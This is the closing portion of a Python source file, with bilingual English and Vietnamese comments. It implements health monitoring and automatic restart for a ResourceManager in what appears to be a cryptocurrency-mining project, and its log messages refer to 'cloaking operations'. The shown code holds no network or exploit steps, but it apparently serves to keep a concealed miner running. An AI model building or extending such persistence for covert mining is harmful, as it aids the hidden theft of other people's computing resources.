                # **TIER 3 FIX: Critical SharedResourceManager health check** (kiểm tra sức khỏe SharedResourceManager quan trọng)
                if rm_instance_healthy:
                    rm_shared_manager_healthy = (hasattr(rm_instance, 'shared_resource_manager') and 
                                                rm_instance.shared_resource_manager is not None)
                    
                    if not rm_shared_manager_healthy:
                        monitor_logger.error(f"❌ [TIER-3] CRITICAL: ResourceManager exists but SharedResourceManager is None!")
                        monitor_logger.error(f"🔍 [TIER-3] This is the ROOT CAUSE of cloaking failures!")

                    # 🔎 BỔ SUNG: kiểm tra tắc nghẽn hàng đợi của ResourceManager
                    try:
                        rm_queue_size = rm_instance._pid_queue.qsize() if hasattr(rm_instance, '_pid_queue') else 0
                        rm_queue_threshold = int(os.getenv('RM_QUEUE_WARN_THRESHOLD', '1'))
                        if rm_queue_size > rm_queue_threshold:
                            rm_queue_ok = False
                            monitor_logger.error(f"🚦 [TIER-3] RM queue backlog detected: size={rm_queue_size} > threshold={rm_queue_threshold}")
                    except Exception as qerr:
                        monitor_logger.debug(f"[TIER-3] RM queue check error: {qerr}")
                        
                    # 🔎 BỔ SUNG: kiểm tra tắc nghẽn pending handoffs của DirectPIDRegistry
                    try:
                        from pid_logger.direct_registry import get_direct_registry
                        registry = get_direct_registry()
                        pending_size = registry.get_pending_handoffs_size() if hasattr(registry, 'get_pending_handoffs_size') else 0
                        pending_threshold = int(os.getenv('REGISTRY_PENDING_WARN_THRESHOLD', '0'))
                        if pending_size > pending_threshold:
                            registry_pending_ok = False
                            monitor_logger.error(f"🚦 [TIER-3] Registry pending handoffs backlog: size={pending_size} > threshold={pending_threshold}")
                    except Exception as perr:
                        monitor_logger.debug(f"[TIER-3] Registry pending check error: {perr}")
                        
            except Exception as rm_check_error:
                monitor_logger.error(f"❌ [TIER-3] ResourceManager instance check error: {rm_check_error}")
            
            # **TIER 3 FIX: Enhanced Overall Health Assessment** (đánh giá sức khỏe tổng thể nâng cao)
            overall_healthy = (
                thread_alive and rm_instance_healthy and rm_ready and rm_shared_manager_healthy and rm_queue_ok and registry_pending_ok
            )
            
            if overall_healthy:
                health_stats['healthy_checks'] += 1
                monitor_logger.debug(f"✅ [TIER-3] ResourceManager fully healthy - thread: {thread_alive}, instance: {rm_instance_healthy}, ready: {rm_ready}, shared_manager: {rm_shared_manager_healthy}")
            else:
                health_stats['unhealthy_checks'] += 1
                monitor_logger.error(f"❌ [TIER-3] ResourceManager unhealthy - thread: {thread_alive}, instance: {rm_instance_healthy}, ready: {rm_ready}, shared_manager: {rm_shared_manager_healthy}")
                
                # **TIER 3 FIX: Detailed diagnosis for SharedResourceManager** (chẩn đoán chi tiết cho SharedResourceManager)
                if rm_instance_healthy and rm_ready and not rm_shared_manager_healthy:
                    monitor_logger.error(f"🚨 [TIER-3] DIAGNOSIS: ResourceManager started but SharedResourceManager initialization failed!")
                    monitor_logger.error(f"🔍 [TIER-3] This will cause ALL cloaking operations to fail silently!")
                
                # **🥉 SOLUTION 3: Automatic Restart Logic** (logic khởi động lại tự động)
                if (restart_attempts < max_restart_attempts and 
                    current_time - last_restart_time > restart_cooldown):
                    
                    monitor_logger.warning(f"🔄 [HEALTH-MONITOR] Attempting ResourceManager restart (attempt {restart_attempts + 1}/{max_restart_attempts})")
                    
                    restart_success = attempt_resource_manager_restart()
                    restart_attempts += 1
                    last_restart_time = current_time
                    health_stats['restart_attempts'] += 1
                    
                    if restart_success:
                        health_stats['successful_restarts'] += 1
                        monitor_logger.info(f"✅ [HEALTH-MONITOR] ResourceManager restart successful")
                        # Reset restart attempts on successful restart
                        restart_attempts = 0
                    else:
                        health_stats['failed_restarts'] += 1
                        monitor_logger.error(f"❌ [HEALTH-MONITOR] ResourceManager restart failed")
                else:
                    if restart_attempts >= max_restart_attempts:
                        monitor_logger.error(f"🚨 [HEALTH-MONITOR] Maximum restart attempts ({max_restart_attempts}) exceeded")
                    elif current_time - last_restart_time <= restart_cooldown:
                        remaining_cooldown = restart_cooldown - (current_time - last_restart_time)
                        monitor_logger.debug(f"⏳ [HEALTH-MONITOR] Restart cooldown active - {remaining_cooldown:.1f}s remaining")
            
            # **🥉 SOLUTION 3: Periodic Health Report** (báo cáo sức khỏe định kỳ)
            if health_stats['total_checks'] % 10 == 0:  # Every 10 checks (5 minutes)
                monitor_uptime = current_time - health_stats['monitor_start_time']
                healthy_percentage = (health_stats['healthy_checks'] / health_stats['total_checks']) * 100
                
                monitor_logger.info(f"📊 [HEALTH-REPORT] Uptime: {monitor_uptime/3600:.1f}h, "
                                  f"Health: {healthy_percentage:.1f}%, "
                                  f"Checks: {health_stats['total_checks']}, "
                                  f"Restarts: {health_stats['successful_restarts']}/{health_stats['restart_attempts']}")
            
            # **Wait for next check** (chờ kiểm tra tiếp theo)
            time.sleep(check_interval)
            
        except Exception as e:
            monitor_logger.error(f"❌ [HEALTH-MONITOR] Health monitoring error: {e}")
            time.sleep(check_interval)  # Continue monitoring despite errors
    
    monitor_logger.info("🔚 [HEALTH-MONITOR] ResourceManager health monitoring stopped")

def attempt_resource_manager_restart():
    """
    **🥉 SOLUTION 3: Attempt ResourceManager Restart** (thử khởi động lại ResourceManager)
    
    Attempts to restart ResourceManager instance.
    
    Returns:
        bool: True if restart successful
    """
    restart_logger = logging.getLogger('start_mining.restart')
    
    try:
        restart_logger.info("🔄 [RESTART] Attempting ResourceManager restart...")
        
        # **Step 1: Cleanup existing instance** (dọn dẹp instance hiện tại)
        try:
            from mining_environment.scripts.resource_manager import ResourceManager
            if ResourceManager._instance:
                restart_logger.info("🧹 [RESTART] Cleaning up existing ResourceManager instance...")
                ResourceManager._instance.shutdown()
                ResourceManager._instance = None
                time.sleep(2.0)  # Allow cleanup to complete
        except Exception as cleanup_error:
            restart_logger.warning(f"⚠️ [RESTART] Cleanup error (continuing): {cleanup_error}")
        
        # **Step 2: Create new instance** (tạo instance mới)
        restart_logger.info("🚀 [RESTART] Creating new ResourceManager instance...")
        
        # Start new ResourceManager thread
        new_rm_thread = threading.Thread(
            target=lambda: start_resource_manager_thread(),
            daemon=True,
            name="RestartedResourceManagerThread"
        )
        new_rm_thread.start()
        
        # **Step 3: Wait for initialization** (chờ khởi tạo)
        new_rm_thread.join(timeout=10.0)  # 10 second timeout for restart
        
        # **Step 4: Verify restart success** (xác minh khởi động lại thành công)
        try:
            from mining_environment.scripts.resource_manager import ResourceManager
            if ResourceManager._instance and ResourceManager.is_ready():
                restart_logger.info("✅ [RESTART] ResourceManager restart successful and ready")
                return True
            else:
                restart_logger.error("❌ [RESTART] ResourceManager restart failed - instance not ready")
                return False
        except Exception as verify_error:
            restart_logger.error(f"❌ [RESTART] Verification failed: {verify_error}")
            return False
        
    except Exception as e:
        restart_logger.error(f"❌ [RESTART] ResourceManager restart failed: {e}")
        return False

if __name__ == "__main__":
    main()
